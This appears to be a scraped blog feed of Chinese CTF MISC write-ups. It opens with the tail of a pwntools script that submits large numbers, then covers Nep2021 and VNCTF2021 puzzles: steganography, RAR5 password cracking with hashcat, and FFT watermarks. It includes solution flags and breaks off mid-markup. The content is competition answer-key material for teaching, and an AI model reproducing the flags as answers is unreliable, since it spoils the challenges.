1128879668520585720428622237742490512537950359402205324001995495074505807089644668448393383213154048818981685410508280672403006942175254143340620979643541341540074337572659622703360744479191758526561879748065269225331493156319797202196698953093091118268663180285453994173175004765042540875901896560172126805963396790075724648861284061587949206539942962129412131995287496570144629907257102335817747474586134616799127347111891708334557715358473749128447523960311368632111187524169171349903681252047364790356294740543040289664587755687750107722774759862119191799852175001489149275860198133527599004010589703785960337252846734341350955273111125113685791268561493953580889137093318460379114925753926139452652678469214058672198208237080575292099030434720230371019151930821777059596403590137514162396944094077882663593602532834157681855429204563684714007140790471341731865660059139398388366172399274776878238470590564900337146592840055286970658590626056064774635037184621116150135854418956354510228350086920816992573510920569142525094101331103865716360093037599947187352903338592828664415300111098987525354000528988539370713205032546695346298781626827639615547289652649948996485550687407583089787140208368014043142638420083431583735065909488869448639307088567210131319590284847238355714331037717182304377120888237618040993668130877092086293688186390937832034765693427660886462975244457222485897333426083174195975863029051784841114606257147096809874368016484207233438338509864968&#39;)</span><br><span class="line">p.sendlineafter(&#39;[&gt;] y:&#39;,&#39;47622450400948378838383772282463774606862475585470916135643120242889164588999536917143252778898237971519642050232275519904346077796804164997665170205968559976309128127925359988920951940206912919554809735600309714561600669180191562523906954373442895286177820090074271444866144401506681728848985841518809813817744245369156604056715252134781651290696247931418719827721409603298669191348612295024182755007100463679890698670970772218604919944523548556339943990850928329334044482351470144751278631230052483209229192136090007700973362792766305057772210218843096395204004481827871813127982371104261927151640854476471691258603962738116589877882203513684178221638481443997120721426951288321845195709538874283311496775212472633043757016949413544955089450529970071115171319204455757146236186283669069688840344104909843453532933741359090255143237887602089268418356097385230465055288442812353852678109364557896410605519305061329809194582847670449343808895801066484058241857852557025853970470346734297512391305668724507609507860997210910249828839975095498003479392729012450557551501558320236220920957164255349717391566888082337651296824625293758028502677596286857109601061747560818473556222963976245224436029590094669629286031110344430825748468172810347309875610823148486669786946210224096523266839596074611763758157557664013300435818412520127102295208939189906585620396212651765699761291878071263904189401224066323142807351350771288944210158279686921742294747307474233600865491069252006522535488189377697928025125557621379549255290434908346038130268791214288761888173148344653009237658149639465258186543795913644724483967167271354216410857782569840456443439191163524988860419550058863439011112647571765143098332645498985654541702199457567021375604151698069751565059399207164022611522991554954322337382634649727285217129423673370394965121067239894366149581109228445711919745882281342614646173496777927189158828873291373360559493626235980310503651954583446014359765608056405680697149732429212383292427158489912859600560764546409487137797434433280391746835155157023613387021771257903833401416657254712158341427482279548188517245020827649635343698774804958039887874677668293792752410148798450853470012738072908329266410979821696916469513375891863148739598334904827404460820947224418582238623488603934818365623881078631861542509103895074183496885978299923729454828974760861965227627240219823926287218746031610309230743922733682874795150985436217330699586340400912320670388975069961195118990128872085568496625327692693432900622868904887568511422015928091397130006637366088807249451579584296668364743256869381706306860780375897099571626209545626485944716947896464577148689231222737379171911134294203436527612713553746799327282889817221830528744366228624963184335138436843991411220561872387514837317617725088051768758821799717134972056130662827963575852075195983333237812361469358928050372207865758118382197475583604897923869874443254558509491089094497114309187515435417626768692338314768879199254962134071364892503433291512653074139512155522589222479395052657948150741190520214628284891464936780162688434679291410736556884486773696840381406282032875195723530086887753071363641544299638554503482403044827489580056913943422699970704859738311408892499707908489253243553716995417910394398094100749297597547580211158200206330030361004088378215696877933199873683522779889198901930937215425097187656672830486004822490294320139664485427561504232130257623519683347400842087756573452879355666822274541394819212535164620698017642540024964879529442496467620788094786440378476823695293501722495338784621644962662327864386529025226531680747525116663651083867870952664381887535020135683653867535500764985777586994135175757313800702085306105423536196873700543907429173383740071355554433235790028028913063521657396875545515280730719253230768312689362173644652095812428829060569326084255919425957186992895406713009973532453651237396275339660722984857993571948014177882269245678789940694598886067003485062545812158114223243596985982981053929849377362932912968592983160821938296512313053406706366570551134248607106838991076299811097232369731983873397568183604741730679477708228043724274236971655276883587537538807463933248573056764890328937147993552897863908422809744532916448505130307316345603250021629200966979727553566898848418212050469040462774067434279504303064273954443870971451129233529449800530988407135418019143122293348275498630841723639872063348515200353880053898537816522858218623188622751826735048654693126489566783502051135681427010709684649132264136843643574234222127181277585421920287397212371635900068620872015237701184536167275969863375956410621166928239826276150733735560005835242757705026050498056686664492317443869890115549535953605656840319187701634496815261905403829900411155129186253431300704606916547191143757850974622268610491295742185729093409192567569751484195005154100683306654779007665669728792963209833514009497910233070844858781637129847244418735700272643945288880602248591506142020110809954124229243650347853949950615679125504309603268168970087780082752748418531873061421099344561758754414122646701643857380924441570725935144434391134626028509815913280036817355699592050233801080040353249527134723579200097042105263761350123881231422906878938655350539034665984543299464199719993288263333879987368133210745062241607017400289127218733968733124756652452939417370203706536373812620169103207477941223978551834048584046637279693226304436911401963976815152363999340062727737206096822311985120175950512924402251872044716022462706876189642892600376531572498967&#39;)</span><br><span class="line">p.sendlineafter(&#39;[&gt;] z:&#39;,&#39;6692730096259452643369104960627455630486215862399671626732511651080481725914118043331962481949887246701616498356166181463604926787704653729996524875944166464259834513341705159840317679808261520484528369303565687257064907833628722706736890217964224422223998452334667877204269030436124986535368385034217958050214758008075705340244612677399960920232432270936246267613432813660990366567228079750807890066079611266367346864160511628226289909730940074689153001802775046666179052632981030614614169569391452067758516455221647484030999554706461123791807054670937722216527237831406838479377545766845200930604834889512899500298890279463693292123492722332964766293920612462482832346906579356853165719135718614757414077012806506891804144857723803907676032689642786952845709990953932549363099277202376455866403343511636096090375135224056359990162308934493705571731817161204022064082776683415625288907335128227482210147359946199187596915617399127457890619731551245662573544480434303562880059763371510761927915895906816154741217474757012037948333052450948476074779692568524946903249315558861221338345333707757506558596252170626033347982508660529595727154556214962133515612611016236612647370563803336371277474122183675326321775888376588019649186941050457093330574306006986097505564912850747944195881019554947202505040052804598375384739818930341354578533986322895086376858707463392009316120030250126712526017586828270649304748716858128207666637663463616763441471078140139397165398583082792700730916946522609308347804497092788797288655742983063401287929657658976022731909898318616931557751739391419299632140075177345562777607172891334227363324171818253438628193523635359638830124084206940507156748690007173906158332911198479931217612571332175228285424725788618932441123312056841558681171044031534689729724691692912359887866667930883571803897811767970302335614219823583212530946330960425630170759880575140525980655912864408561070271281256235441915992173078282832751522617530913457332359506998401455770170148507223571372814959845223749946250391821473437923170419836829629573389065359875395735969558797082534386336670004171504123398260118906657430620905923442497543912091623694459665406533851295585577716831411779117126645622931046613934399425097865071551562607352459925632847376933960796535324837598687628712655007121426904118192945265333766905073914839487266825952061145886314105700264580892659214832501756632175256329239482959935590623864400784418843182077217334193177197696837594211308483641010337802908540807811308881492169321137882307683712433297499007946781116061320458705721560125360842061486428850165801712957979595359246728776430639245939636738948374761658954061826209691051920957797067434218054572681739182471133280523370552885267688527726127135134270330852701348584033118514142382336116407399008075996860982473510530346022361230317172840057578686001163210274329974595126286187269014026433799441121386883231381984306214840014935709084077222504721973335222668527808855559610990711488108899107512957141381420732916565500896920478134482742963861647524468723317202105177122047589163963776903970183491643712078839753127169721419656802120034479275632337807924544614498110240363188487068594679650721290227877054858558111252685500296470242670684134891258621448609138267737182763032469423691128748192585991339150082774098556015718505017431352118078322619870689991014115031741711290769496089014977880570263266405690441911703781396906998762963587612999641290185250072869170440998075953692342671487460709193956045971969356326209070905623784688123412057499359044056826754728447850124347648398710550218154116952578196233513878798252059822638656328544635582956335584231888174374941455674902151097107216854418487873371668727710211558581171277145725681652074404567177285568687595945357490783390784232306424563694736533020608498181464646971181770196876384953469622440846514006232384210961579158336899260081585536468500934980497170535612446252975896695526200287578712298314622454508448363640890747229139443768079583177480872178042259050166177688625276376213463703266639188395613252991270000795977687386423737853169071311746970345634184517790850697224560536919249448868582994389668475556905130571202552218257473659915042192852883158829520722740650513765041860440266491282066812530716688774135015932473130727413733116681785660017420242862228536599943421961099282741943719358222072007939854053509521905735912191309088131695308739956798885671694328458098321491372884169420463319900482341649820798039294107822946250917886176746645780913148275745781620821252781169313295613808543152058629071010936935426042544003657991023530442000967140490604075975244178975806038991746932562976007960411034074895087917279784536437641619888646710861410596842178036218663126583685587080880228752877783782319015943806200498797807843784497766965338186516923592678329622986749043139097599188984217640583316895265361154438849767555629158421509916829272788880623767533583482040026964428256454562903529935552136541947137147274973714527471950166304339163636952976732589610760660374407640321978111107637740755852017091520655110597205198842248308933217962442651853490174911403756247603565731181111671683928302166630842756928837169769877128819926602478968210662873624252901764427943619832956659552493674351362220715335865324112698992725740083263995933814196117674869528535175868791264054216712326268429406736707035618273426834172587106600230739062978250941965654621128900832876783234653461887966954026005333565342496743505345812402536575799940100433925667207864266152565347803725841484762656261514597525355&#39;)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#39;[&gt;] x:&#39;,&#39;&#39;)</span><br><span class="line">p.sendlineafter(&#39;[&gt;] y:&#39;,&#39;&#39;)</span><br><span class="line">p.sendlineafter(&#39;[&gt;] z:&#39;,&#39;6757371787046068139667201010893827259352180063880359149347052632301136153051558660697373021236645293205565227990905341645877134402231836160288526336100006319893025316509843425529380757439480726788711702040594279434239014696552515835042756832988373032719323122954866309692833045139967292353223393488665907661509529280901949351156145570794630672220580702965027485819964788510175928934553607146101552015450958592213318669644778052767159151433106024317298978469847330947998554876896679941227362826814251006225907364737975213659154880967203856438505175602038675691540455780906880282645801513278585192582240454724185292786092937629091401355615019681206372879118924349761180046787523299300262570387488755461176876072637874712526810213316988703051076389762949202733162457880729461913399481430141647521132424583282510084131558360981208826483260170395400866573111019317502663606454570993096778600639156133698170979041640243141885526850322876410400566755436136224911891131082251223209928285745514941392254805755937722835435647137928555826661680826227015520386746766480820125401242870769079967291453144120537506586812802553415447292372228318628389558125426002249925254838836231762593979492200566612310246154938701244941217010455332488549457060947830505667865528154277793038771410469170383008980422199703139245696367890020050426029234749700394791926427986384476397595497535393962325418508237542112699631199954744892100970059801622648702489437601581282342025705039820067668580412021803430231966998933648772104264159193404873719999575719087634348995945059216145446397047226984424349695008860272092797338029126810728351222015650199534569415427530399020249995538776601674180178805160185323129804096228450803563763408490876124747896315197293867695740552097472935769562864646619461811332464779500638153082231967099853544773279389849287808564994619482191689540285905719126814199301434592074618568042048218763326514957672840102351988582239509179255510329629274554728524704349585622303724874756501277836698947423791063474983352447428543107129386048543513605735808678333789668871348452460903962519454375470482204317093661954418674634626065529962865249520478072860538611393230990140711094353122910190658204168249238159368804474574860124421164680347495793953529853621604068573585731322532617511088743070418696602113169386241017286906728346419932307192750414540791109578772011365267354726781270717001480901025248074197974069056536591467439173002127739523666023027574563272143557201569513241231173599591301849461123529607721409766749279351537814186775272804842684803579263821306271390051103133282840363148672891737471737533107454894408108106100111845048085664718123454714170545779689537029808768957774092943220889360247515543410024101720391490073342323318731100431311650075243046933998634526168353432610351903498726198312347708572259917900391794000746396177357369041612793494843359959696933917776753465981913541370482448761611609839455834380613580836782637251822149159657858426241226228679713193048832149211452337269967502947293598739495986748394811842407422000849781210490469777458120598766682938795797202252956937228931475950633598872137807580843585020999868124887925950526386651086702449352107273314446667906578240670463790916151899942347080350684012600682529016371430553101949139071475494324937885766099141556318343878025358174834217374351739026716341194216733682357039559281726400689470150839227080608623575059279322964387545330718998276126777941951298318574877260899016309136963295097325690898265216500059658475135313640154232209375687158645796821635560552287433902502619432134201770022478388713449572626481357189311269486494588763683912162825463831082057237055000978325704613039337398715296998751301534349127073952109221789253091615619446385043111805482051069329221256806870205254531093948196628519165662304389821143860432665789521401676324400689508209190538669835461571749739955832194024392958245878527350099123738832967388251623284243119045414405092174269703479274231695314640700235712264488085780296611592884525436819390229693830755007590494042745727849502287597934292063285094560735475167061711396735997052712465002624944867289149107796542730094201653937665025327223498331165192307702708150030034078985086732223542732309297206063211093464083036621785007903091618275373090433888822655950676561272610570736774571612091846938776312615945209666351074349440879789618061998759670003662717100212796269680480477820186990882905965817773014505658485987855011257398761934558273317848076809732840559591076632844987216194579994396090625972981487319694325145579161319487394812059697402840437312752707844270525728513794033258292426235074946656146858866595665867082524076197709028912127202170696414967981465564557802031352010551809928341810556047500490558962674334511794075600951375746436713106353352865313183594267126304669267104599470216569609698623087407576786114285248252462597329504612197031907486880490472027873783833501362889145954988249146767761245595739168922489192342425634096784806439136226372970136825711316778149683667240595860225581515904211052973886521910376326455973705527149401801960661613561375261619949747500044292643432852725387121303011277408307636679507157484457435893865050611499218921332614733794466974409460230269783783090254320162894881312576539348218596015938174363930923356608422549199678777296299639411050433999625623013119671979857794474958077336801417872069563620440100010720285895347187175529441655592247953398556013920016138024064505650987787637674936643251832546518639149784749058801886334000279439213396115904272668553994023079878354709452930539171599094778881512536317434058985507441062329024267411575227374396964969037305964917143999050850779907438705109689083146774185747333232769969096112500190692696772571092965405713787580060588240512388944164097511812138457458078693884767270384799526150594922861228633450854417695256663830890983634121361210841509735893548743144476661721278638009578154827544517795264305103615705850837722324192019498187342288633186185381463708308667838260294432126242547325567946241599977242385773066222450972794045480687618789829294417081073493760809019674611517968647094569592869866680136759781238158490312216075823176431083105926662269695328636637941491835585889177097509844134654900341569829505652495303140261729230304310911356922182738143976841053617150107948265718527295090245704994474898183172229127590904655246423405408295817163761897362445096236063988637954756291714674001263872413201608583182711947374173009492875753531933878853960114230258899057906878332797386495378055437794000868748850752721338379232584174174052788947474035685333735320030304696328701498455679829450269507960381834783529104425042443052269667117059401618946142466769622562494585437773574448624183418436681153396461973467052449975840985618136871368776849884345465681289972550626149617134997258618257632438488535726934642621130133687854294857217185951457739998096977927169591834079280465951391547495185030612068903715357966528497732722207992729528415044175612404390738258337474254221129837727357382475790237659580291896294782824388982206734102088676441441248682210900926838839926750948978708757185432357740303452370103270487617497097918387130482560266999096277176165057405114801689324032495315547344703773363383200225586262443913123002992789399716818314320216593735286440310702738885451243283983174584298007494491624615967817551089535001455761753490005828410367469167259865937758561688210467774162281345734272302685278779758246712398003121048670013814916516079947238543075758209608263260765319214887999050677592405190178063147810916110818922303046789516080441358904336634993875194674228996043813280728266717554584483678239396428599240243065079105286290872141390178186912198092807707827340253627744709886189481568232700962251374999348325101266394471947134660700964441835171957121489524985290534224416996946581613925804858672100553270654325469387284843139837360811856472622948161055529343170829727575193812943833584422097675599745978130388377422482155414226289733761591553536170816520748136096660855277104303157029866334382369220598931062085646021749566099998534992608588558304974330894055534375874863721924457676723362578052402647491487501121653224866234267927009786361519918370780114057754311718001077558912992806893768829476452799640791000953202314337676615559950983923719109572401054270457281888183475668023533914167&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line">print(p)</span><br><span class="line">#flag is: flag&#123;1f88de74-b6af-4b2b-abd5-46356151698b&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h3&gt;&lt;span id=&quot;2021数字中国创新大赛虎符网络安全赛道&quot;&gt;2021数字中国创新大赛虎符网络安全赛道&lt;/span&gt;&lt;/h3&gt;
&lt;hr&gt;
&lt;h4&gt;&lt;span id=&quot;你会日志分析吗&quot;&gt;你会日志分析吗&lt;/span&gt;&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;线索只有一份a</summary>
      
    
    
    
    
    <category term="challenge" scheme="http://mklkx.github.io/tags/challenge/"/>
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>Nep2021</title>
    <link href="http://mklkx.github.io/2021/03/25/Nep2021/"/>
    <id>http://mklkx.github.io/2021/03/25/Nep2021/</id>
    <published>2021-03-25T07:43:21.000Z</published>
    <updated>2021-05-04T11:38:59.436Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="1">1</span></h3><h4><span id="涅普冬令营misc签到"></span></h4><blockquote><p>sharun：这题有很多解啊</p></blockquote><p>本次涅普MISC的感受是，考点不难，只要找到点和合适的工具就能出。恍然大悟</p><p>签到题是这样的</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag &#x3D;[0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffff</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>第一次尝试可能是异或，想了想后发现如上所示，大部分是0xf，是相同的字符，奇怪</p><p>第二次尝试直接转十六进制，全是不可见字符，失败</p><p>第三次觉得可能是纯几何的图案题：</p><p><img src="654SJK.png" alt="654SJK"></p><p>但是总觉得差一口气</p><p>第四次尝试回到了第二次的思路，进制转换看看。</p><p><img src="65hXZR.png" alt="65hXZR"></p><p>看不出来名堂，便开始玩了。</p><p><img src="65hvIx.png" alt="65hvIx"></p><p>有意思嘿。隐隐约约能看到NEP字样。</p><p>把内容移到sublime</p><p>因为它的文字内容能够根据应用边距的变化而变化。</p><p>不断调整</p><p><img src="65hzi6.png" alt="65hzi6"></p><p>看到希望了！</p><p><img src="65hjd1.png" alt="65hjd1"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Nep&#123;Y0u_ar3_50_cl3ver!&#125;</span><br></pre></td></tr></table></figure><p>解出来之后想起一道相似的入门题。</p><h3><span id="2">2</span></h3><h4><span id="涅普冬令营出题人日记"></span></h4><blockquote><p>我把茶包的出题日记找到了，里面居然有！！！</p></blockquote><p>得到出题人日记.zip</p><p>解压得xlsx</p><p>根据经验更改后缀为.zip</p><p>winrar打开看到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">隐写.wf pna fbyir guvf ceboyrz</span><br></pre></td></tr></table></figure><p>怀疑栅栏</p><p><img src="65Tv80.png" alt="65Tv80"></p><p>打开/xl</p><p><img src="65TO5n.png" alt="65TO5n"></p><p>在shareStrings.xml里看到日记内容</p><p>重点在于：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-&lt;si&gt;</span><br><span class="line"></span><br><span class="line">&lt;t&gt;菜鸡的第十八天日记&lt;&#x2F;t&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;si&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-&lt;si&gt;</span><br><span class="line"></span><br><span class="line">&lt;t&gt;前言：好像是这个女人，但是又好像不是这个女人诶，我好像找到她了！&lt;&#x2F;t&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;si&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-&lt;si&gt;</span><br><span class="line"></span><br><span class="line">&lt;t&gt;rot13是个好东西不是吗？&lt;&#x2F;t&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;si&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-&lt;si&gt;</span><br><span class="line"></span><br><span class="line">&lt;t&gt;flag在里面啦！！！大佬们再找找？？？&lt;&#x2F;t&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;si&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-&lt;si&gt;</span><br><span class="line"></span><br><span class="line">&lt;t&gt;出题第十八天&lt;&#x2F;t&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;si&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-&lt;si&gt;</span><br><span class="line"></span><br><span class="line">&lt;t&gt;高兴&lt;&#x2F;t&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;si&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-&lt;si&gt;</span><br><span class="line"></span><br><span class="line">&lt;t&gt;我好像找到了这个女人了，终于问到师傅们菜鸡可以出什么题了，她跟我说她叫fufu，然后让我把flag藏到她身上，好像很有道理的样子诶，这就把flag交给她！&lt;&#x2F;t&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;si&gt;</span><br></pre></td></tr></table></figure><p>依次处理</p><p>上述文本rot13后：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">隐写.js can solve this problem</span><br></pre></td></tr></table></figure><p>在/media里得到几张图片</p><p><img src="65TO5n.png" alt="65TO5n"></p><p>fufufufufufufufufuufufufufufufufufufufufufufufufufu.flag查看二进制后，更改后缀为.png</p><p>得到与image3.gif第一帧相同的图片，猜想盲水印。对比无果。</p><p>卡了很久。</p><p>尝试js隐写，查询【png隐写js】类似关键字无果。</p><p>突然想到，隐写=steganography，隐写.js=steganography.js</p><p>查询搜索引擎得</p><p><a href="http://www.peter-eigenschink.at/projects/steganographyjs/showcase/">http://www.peter-eigenschink.at/projects/steganographyjs/showcase/</a></p><p>秒出</p><p><img src="65TjCq.png" alt="65TjCq"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Nep &#123;D4La0_s0lve_th1s_probl3m_to_hit_c4ij1&#125;</span><br></pre></td></tr></table></figure><h3><span id="3">3</span></h3><h4><span id="make_hsy_great_again">make_hsy_great_again</span></h4><blockquote><p>Q师傅是韩商言的粉丝，前段日子他刚组装了台新电脑，并且要求我帮他装系统，我在他电脑里发现了这个。</p></blockquote><p>得到加密的make hsy great again_.rar</p><p>rar5用hashcat</p><p>第一步：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#rar2john hsy.rar</span><br><span class="line">&gt;hsy.rar:$rar5$16$fe5656ec27f0754cb92ca0a79120e099$15$974a98d46f1d4da877c271091ea930e9$8$48f568d6888772c2</span><br></pre></td></tr></table></figure><p>第二步：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashcat --force -m 13000 -a 3 &#39;$rar5$16$fe5656ec27f0754cb92ca0a79120e099$15$974a98d46f1d4da877c271091ea930e9$8$48f568d6888772c2&#39; ?d?d?d?d?d?d</span><br></pre></td></tr></table></figure><p>开始爆破</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$rar5$16$fe5656ec27f0754cb92ca0a79120e099$15$974a98d46f1d4da877c271091ea930e9$8$48f568d6888772c2:520233</span><br><span class="line">                                                 </span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Type........: RAR5</span><br><span class="line">Hash.Target......: $rar5$16$fe5656ec27f0754cb92ca0a79120e099$15$974a98...8772c2</span><br><span class="line">Time.Started.....: Thu Mar 25 14:36:44 2021 (14 mins, 55 secs)</span><br><span class="line">Time.Estimated...: Thu Mar 25 14:51:39 2021 (0 secs)</span><br><span class="line">Guess.Mask.......: ?d?d?d?d?d?d [6]</span><br><span class="line">Guess.Queue......: 1&#x2F;1 (100.00%)</span><br><span class="line">Speed.#1.........:      262 H&#x2F;s (6.99ms) @ Accel:512 Loops:128 Thr:1 Vec:8</span><br><span class="line">Recovered........: 1&#x2F;1 (100.00%) Digests, 1&#x2F;1 (100.00%) Salts</span><br><span class="line">Progress.........: 233984&#x2F;1000000 (23.40%)</span><br><span class="line">Rejected.........: 0&#x2F;233984 (0.00%)</span><br><span class="line">Restore.Point....: 23040&#x2F;100000 (23.04%)</span><br><span class="line">Restore.Sub.#1...: Salt:0 Amplifier:6-7 Iteration:32768-32799</span><br><span class="line">Candidates.#1....: 525587 -&gt; 516587</span><br></pre></td></tr></table></figure><p>密码【520233】，得到【hhhhhhsy.png】</p><p>通过010editor看到格式</p><p><img src="hsy.jpg" alt="hsy"></p><p>结合png格式，编写倒置函数：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;Untitled1&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line"></span><br><span class="line">   <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> g:</span><br><span class="line"></span><br><span class="line">        g.write(f.read()[::-<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>得到另一张图片【flag.png】，表面看跟已知图片一样，丢进Beyond Compare 4</p><p>对比两张图片，得到</p><p><img src="hsy2.jpg" alt="hsy2"></p><p>根据提示【flag{too_young_too_simple hint Crypto}】</p><p>找到hint Crypto脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">im = Image.<span class="built_in">open</span>(<span class="string">&#x27;flag.png&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">72</span>):</span><br><span class="line">    a = im.getpixel((<span class="number">2069</span>,j))[<span class="number">3</span>]</span><br><span class="line">    flag += <span class="built_in">str</span>(a)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(flag))</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Nep&#123;Qfrost_l0v3_hsy_v3r7_m0ch&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h3&gt;&lt;span id=&quot;1&quot;&gt;1&lt;/span&gt;&lt;/h3&gt;
&lt;h4&gt;&lt;span id=&quot;涅普冬令营misc签到&quot;&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;sharun：这题有很多解啊&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;本次涅普MISC的感受是，考点不难</summary>
      
    
    
    
    
    <category term="challenge" scheme="http://mklkx.github.io/tags/challenge/"/>
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>VNCTF2021</title>
    <link href="http://mklkx.github.io/2021/03/24/VNCTF2021/"/>
    <id>http://mklkx.github.io/2021/03/24/VNCTF2021/</id>
    <published>2021-03-24T07:32:05.000Z</published>
    <updated>2021-05-04T11:39:39.242Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="1">1</span></h3><h4><span id="vnctf-2021冰冰好像藏着秘密">[VNCTF 2021]冰冰好像藏着秘密</span></h4><blockquote><p>发现冰冰藏着的flag，flag格式为VNCTF{*}</p></blockquote><p>得到FFT.rar</p><p>但是直接打开会提示</p><p><img src="FFT.jpg" alt="FFT"></p><p><img src="FFT2.jpg" alt="FFT2"></p><p>这个存在一个考察的点：rar伪加密</p><p>但是在实战中笔者发现两个绕过的方法</p><p>1)用kali打开</p><p>2)如上图图二所示，在winrar报错的情况下，直接拖出FFT.png，也能达到解压的效果</p><p>而按出题人本身的意思，是在使用010打开的情况下：</p><p>把下图的84改成80</p><p><img src="FFT3.jpg" alt="FFT3"></p><p>第二步：</p><p>1)隐形水印工具也能得到水印：</p><p><img src="FFT6.jpg" alt="FFT6"></p><p>放大可以看到flag</p><p>2)通过搜索得知文件名FFT为：</p><p><img src="FFT4.jpg" alt="FFT4"></p><p>下面是大佬脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2 <span class="keyword">as</span> cv</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">img = cv.imread(<span class="string">&#x27;FFT.png&#x27;</span>, <span class="number">0</span>) <span class="comment">#直接读为灰度图像</span></span><br><span class="line">f = np.fft.fft2(img)            <span class="comment">#做频率变换</span></span><br><span class="line">fshift = np.fft.fftshift(f)     <span class="comment">#转移像素做幅度谱</span></span><br><span class="line">s1 = np.log(np.<span class="built_in">abs</span>(fshift))<span class="comment">#取绝对值：将复数变化成实数取对数的目的为了将数据变化到0-255</span></span><br><span class="line">plt.subplot(<span class="number">121</span>)</span><br><span class="line">plt.imshow(img, <span class="string">&#x27;gray&#x27;</span>)</span><br><span class="line">plt.title(<span class="string">&#x27;original&#x27;</span>)</span><br><span class="line">plt.subplot(<span class="number">122</span>)</span><br><span class="line">plt.imshow(s1,<span class="string">&#x27;gray&#x27;</span>)</span><br><span class="line">plt.title(<span class="string">&#x27;center&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="FFT5.jpg" alt="FFT5"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">VNCTF&#123;Ff5_1S_bEauTiful&#125;</span><br></pre></td></tr></table></figure><h3><span id="2">2</span></h3><h4><span id="vnctf-2021happynewyear">[VNCTF 2021]HAPPYNEWYEAR</span></h4><blockquote><p>祝大家牛年快乐！牛转钱坤！(flag为VNCTF{}）Hint1:<a href="https://www.dcode.fr/tools-list#symbols">https://www.dcode.fr/tools-list#symbols</a>Hint2:stegpy，但是不是那么白给的stegpy</p></blockquote><p>得到加密压缩包和password.png</p><p>可以看出png里藏着古典密码，结合hint1，找到相应的加密方法：</p><p>Chinese Code&amp;Sheikah Language</p><p><img src="HAPPY1.jpg" alt="HAPPY1"></p><p><img src="HAPPY2.jpg" alt="HAPPY2"></p><p>组合得到压缩包密码：</p><p><img src="Inkedpassword_LI.jpg" alt="Inkedpassword_LI"></p><figure class="highlight plain"><table><tr><td 